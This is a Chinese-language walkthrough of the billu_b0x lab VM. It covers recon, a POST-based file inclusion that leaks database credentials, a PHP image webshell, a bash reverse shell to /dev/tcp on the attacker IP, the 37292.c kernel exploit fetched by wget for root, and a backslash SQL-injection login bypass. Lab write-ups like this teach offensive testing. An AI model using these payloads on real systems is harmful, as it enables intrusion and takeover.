[TOC]



这个靶机有两套思路，一套是我主要考虑的，另一套我感觉更好，但是我没有想到

# 思路一

## 信息收集

```
nmap --min-rate 10000 -p- 192.168.174.160
```

只开放了22，80端口

- 分别进行tcp详细扫描和漏洞扫描

![image-20260809221015828](billu_b0x.assets/image-20260809221015828.png)

暂时没有什么重要信息

- 进行UDP端口扫描

![image-20260809221200515](billu_b0x.assets/image-20260809221200515.png)

也没有重要线索

## 端口分析

接下来重点分析80端口

![image-20260809222453628](billu_b0x.assets/image-20260809222453628.png)

默认页面有一句话，意思是展示你的sql技术，大概指的是sql注入

尝试一下万能密码

```
' or '1'='1
```

```
admin' or 1=1--
```

![image-20260809223008669](billu_b0x.assets/image-20260809223008669.png)

没有用，就先跳过了，尝试一下目录爆破

```
gobuster dir -u "http://192.168.174.160" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,txt
```

![image-20260809224754934](billu_b0x.assets/image-20260809224754934.png)

建议以后扫描目录用两个工具，gobuster和dirb，因为这个靶机gobuster扫的目录有漏的，两个可以互补（虽然说只有gobuster扫的话依旧能做出来，但那种办法就是我没有想到的方法）

```
dirb http://192.168.174.160 /usr/share/wordlists/dirb/big.txt
```

![image-20260809225459243](billu_b0x.assets/image-20260809225459243.png)

唯一的区别就是dirb多找了一个/phpmy目录，就是一个数据库管理工具，接下来依次查看爆破出的各目录，查看内容及其源代码

- c.php和show.php页面都为空，没有信息
- images和uploaded_images里面都是图片，尝试过下载，用exiftool，strings，binwalk，以及其他图片隐写处理工具，都没有线索
- add.php是一个上传网站，猜测会和uploaded_images目录有关系，但是传上去的所有文件都没显示，感觉是被过滤了
- head1.php和head2.php是两张在images目录中的图片
- panel.php指向index.php，也就是默认页面
- in.php是一个phpinfo()页面，可能和文件包含漏洞有关
- test.php![image-20260809231918957](billu_b0x.assets/image-20260809231918957.png)

### Bp抓包方便操作

猜测存在文件包含漏洞，参数就是file

尝试

```
http://192.168.174.160/test.php?file=/etc/passwd
```

没有反应，由于在url上输入参数就等同于GET输入，再尝试一下POST传参，可以使用hackerbar，也可以使用burpsuite，这里我使用bp，方便后续操作![image-20260809234309342](billu_b0x.assets/image-20260809234309342.png)

这样可以直接把GET方式转变为POST方式![image-20260809234404926](billu_b0x.assets/image-20260809234404926.png)

发现能成功利用文件包含漏洞，但我们访问的有限，大概像一个普通用户的权限，由于我们并不知道具体文件的位置，所以还是以拿到普通shell为目标，先尝试读取我们爆破出的文件

![image-20260809234653935](billu_b0x.assets/image-20260809234653935.png)

- 读取c.php的源码，发现mysql的用户名以及密码，后续我们可以尝试登陆一下phpmy

- 读取show.php的源码

![image-20260811145307312](billu_b0x.assets/image-20260811145307312.png)

我代码审计的能力还不算特别好，这段没看出什么，只是感觉这个‘name，address’和uploaded_images目录有关

- 读取in.php,images,uploaded_images的源码，都没用信息
- 读取test.php的源码![image-20260811150040813](billu_b0x.assets/image-20260811150040813.png)

这段代码说明了file参数是POST格式的，而且存在文件包含漏洞

- 读取index.php源码![image-20260811150502513](billu_b0x.assets/image-20260811150502513.png)

这段我自己反正是没分析出来，但是这段实际是存在sql注入漏洞的，在第二种思路介绍

- 读取panel.php源码![image-20260811150706078](billu_b0x.assets/image-20260811150706078.png)

发现在这段代码的意思大概是每个不同选择有不同的界面，而且参数都是load，POST格式，说明可能也存在文件包含漏洞

### 登录phpmy

通过文件包含漏洞的file参数查看了c.php的源码，得到了mysql的用户密码![image-20260811175032472](billu_b0x.assets/image-20260811175032472.png)

也就是billu：b0x_billu

![image-20260811175146517](billu_b0x.assets/image-20260811175146517.png)

成功登录（可以在设置里换语言，默认是英文），有两个数据库

![image-20260811175355754](billu_b0x.assets/image-20260811175355754.png)

在ica_lab数据库中的auth表可以找到一个用户以及密码，即biLLu：hEx_it

- 尝试ssh登录，没有效果，在尝试登录默认页面

![image-20260811175551166](billu_b0x.assets/image-20260811175551166.png)

成功登录![image-20260811175614043](billu_b0x.assets/image-20260811175614043.png)

这个页面有两个选项，一个是展示用户，一个是添加用户

- 展示用户的界面内容也是uploaded_images的内容![image-20260811175803371](billu_b0x.assets/image-20260811175803371.png)

- 添加用户的界面是可以正常使用的

用bp进行抓包，并按continue![image-20260811232957068](billu_b0x.assets/image-20260811232957068.png)

发现下面有一个load参数

从之前利用file参数读取panel.php源码中我们发现过一点![image-20260811233150679](billu_b0x.assets/image-20260811233150679.png)

说明load参数应该也是存在文件包含漏洞的

经过测试后发现只能上传图片，那么接下来的思路可以是生成一张图片马，在里面插入命令执行漏洞

```
<?php system($_GET['cmd']);?>
```

------

这里要解释一下，上述是命令执行漏洞

```
include($_GET['file'])
```

这个是文件包含漏洞，文件包含漏洞

`include()` 的作用是：**将指定文件的内容读取出来，并作为 PHP 代码插入到当前位置执行。** 如果包含的文件是 `.txt` 或 `.jpg`，其中的 `<?php ... ?>` 标记内的内容仍然会被 PHP 解释器解析执行。

**关键点：`include()` 接收一个文件路径，而不是一个命令字符串。** 它不会把参数交给系统 shell，而是直接交给 PHP 引擎的文件系统接口去打开文件。因此，你在参数里写系统命令是没有用的——PHP 会去寻找名为你那个命令的文件。

------

所以我们要利用命令执行漏洞，制作出一个包含命令执行漏洞的图片马后用load参数进行访问，再在url直接运行反弹shell就能成功

### 制作图片马

```
exiftool -Comment='<?php system($_GET[cmd]);?>'
```

上传成功后利用load参数尝试访问![image-20260811234038181](billu_b0x.assets/image-20260811234038181.png)

utl输入

```
?cmd=ls
```

发现有回显结果，说明可行，接下来就利用cmd参数执行我们想要执行的命令，也就是执行反弹shell，不过执行前最好url编码一下，毕竟通过GET方式传入的话会通过url解析

```
echo%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E174%2E128%2F4444%200%3E%261%22%20%7C%20bash
```

原句是

```
echo "bash -i >& /dev/tcp/192.168.174.128/4444 0>&1" | bash
```

我不太理解为什么要加echo和bash，平时我都不用，可能与命令要一次执行完有关吧，后续再解释

![image-20260811235712747](billu_b0x.assets/image-20260811235712747.png)

运行后拿到shell![image-20260811235736904](billu_b0x.assets/image-20260811235736904.png)

```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
(Ctrl+z)stty raw -echo; fg
```

得到有完整功能的终端

进行一系列信息收集后发现可能存在内核漏洞

![image-20260812000119082](billu_b0x.assets/image-20260812000119082.png)

最相关的可能就是37292.c了

```
searchsploit -m 37292
```

将脚本下载到本地

```
python3 -m http.server 8080
```

开启服务

将靶机的目录切换为/tmp，这样有下载权限

```
wget http://192.168.174.128:8080/37292.c
```

根据脚本内容提示

```
gcc 37292.c -o 1 && ./1
```

![image-20260812000542584](billu_b0x.assets/image-20260812000542584.png)

成功拿到root

# 思路2

和上边的情况相比，是只用了gobuster一个工具去爆破，也就说没有发现phpmy，那么mysql的账号密码也就成了无效信息，但是可以从默认页面的提示（尝试使用sql注入）来入手

- 利用file参数在查看index.php的源码时

![image-20260812135814137](billu_b0x.assets/image-20260812135814137.png)

这种include（）是文件包含漏洞的重要标志，包含了c.php和head.php两个文件

![image-20260812135936134](billu_b0x.assets/image-20260812135936134.png)

这里利用代码审计的话是可以看出登录逻辑的

最核心的就是

```
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
```

可以看出，还是对输入的username和password进行了拼接，只是将前端输入的内容中的单引号转换为了空字符（过滤掉了单引号'），那么如果我们把username和password都设置为万能密码后加一个反斜杠\，即可成功注入，即为：

or 1=1 #\

 当然也可以设置为：

用户名:\ 
密码: or 1=1 #

 这样进行注入的大致思路我的理解就是反斜杠（\）会被解释为转义字符。登录成功后，成功进入了panel.php
![image-20260812144742192](billu_b0x.assets/image-20260812144742192.png)

也直接进入，不用再去数据库里找信息，其他流程一样